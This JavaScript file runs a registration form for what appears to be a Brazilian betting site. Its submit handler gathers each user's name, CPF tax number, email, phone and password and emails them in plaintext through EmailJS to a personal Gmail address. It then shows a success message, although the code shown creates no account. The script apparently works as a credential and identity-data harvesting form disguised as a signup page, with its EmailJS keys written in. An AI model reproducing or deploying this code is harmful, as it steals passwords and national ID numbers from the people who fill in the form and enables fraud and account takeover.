(function () {
    const publicKey = "XH0ZkcThJYOH2z2rm";
    emailjs.init(publicKey);
})();

function createForm() {
    return {
        name: document.getElementById("name").value,
        cpf: cpf.value,
        email: email.value,
        number: phone.value,
        password: password.value,
        createdAt: Date()
    };
}

document.getElementById('registrationForm').addEventListener('submit', function (event) {
    event.preventDefault();
    if (!validarCPF(cpf.value)) {
        alert("CPF incorreto")
        return;
    }
    const form = createForm();
    const to = "br.pagolbet@gmail.com";
    const subject = "New Register Data";
    const message = JSON.stringify(form);
    const service = "service_z6grszj";
    const template = "template_kdo3wei";

    emailjs.send(service, template, {
        to: to,
        subject: subject,
        message: message
    }).then(function (response) {
        //
    }, function (error) {
        console.log('Erro ao enviar email: ' + JSON.stringify(error));
    });

    alert('Registro efetuado com sucesso');
    //window.location.href = 'https://www.pragmaticplay.com/en/games/gates-of-olympus/?gamelang=pt&cur=BRL';
});

document.getElementById('cpf').addEventListener('input', function (event) {
    let input = event.target;
    input.value = formatCPF(input.value);
});

function formatCPF(value) {
    value = value.replace(/\D/g, ""); 
    value = value.replace(/(\d{3})(\d)/, "$1.$2");
    value = value.replace(/(\d{3})(\d)/, "$1.$2");
    value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    return value;
}

document.getElementById('cpf').addEventListener('keypress', function (event) {
    if (!isNumberKey(event)) {
        event.preventDefault();
    }
});

function isNumberKey(event) {
    var charCode = event.which ? event.which : event.keyCode;
    if (charCode < 48 || charCode > 57) {
        return false;
    }
    return true;
}
cpf.addEventListener("blur", (e) => {
    var isValid = validarCPF(cpf.value);
    if (!isValid) {
        cpf.style.border = "2px solid red";
    } else {
        cpf.style.border = "";
    }
})
cpf.addEventListener("onselect", (e) => {
    cpf.style.border = "";
})

document.getElementById("name").addEventListener("blur", (e) => {
    var value = document.getElementById("name").value;
    document.getElementById("name").value = value.toUpperCase();
})

document.getElementById('phone').addEventListener('input', function (event) {
    let input = event.target;
    let value = input.value.replace(/\D/g, ''); // Remove todos os caracteres não numéricos
    let formattedValue = '';

    if (value.length > 0) {
        formattedValue += '(';
        formattedValue += value.substring(0, 2); // Adiciona os dois primeiros dígitos
    }

    if (value.length > 2) {
        formattedValue += ') ';
        formattedValue += value.substring(2, 7); // Adiciona os próximos cinco dígitos
    }

    if (value.length > 7) {
        formattedValue += '-';
        formattedValue += value.substring(7, 11); // Adiciona os últimos quatro dígitos
    }
    input.value = formattedValue;
});

function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, ''); // Remove todos os caracteres não numéricos

    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) {
        return false; // Verifica se o CPF tem 11 dígitos ou se todos os dígitos são iguais
    }

    let soma = 0;
    let resto;

    for (let i = 1; i <= 9; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
    }

    resto = (soma * 10) % 11;
    if ((resto === 10) || (resto === 11)) {
        resto = 0;
    }
    if (resto !== parseInt(cpf.substring(9, 10))) {
        return false;
    }

    soma = 0;
    for (let i = 1; i <= 10; i++) {
        soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
    }

    resto = (soma * 10) % 11;
    if ((resto === 10) || (resto === 11)) {
        resto = 0;
    }
    if (resto !== parseInt(cpf.substring(10, 11))) {
        return false;
    }

    return true;
}

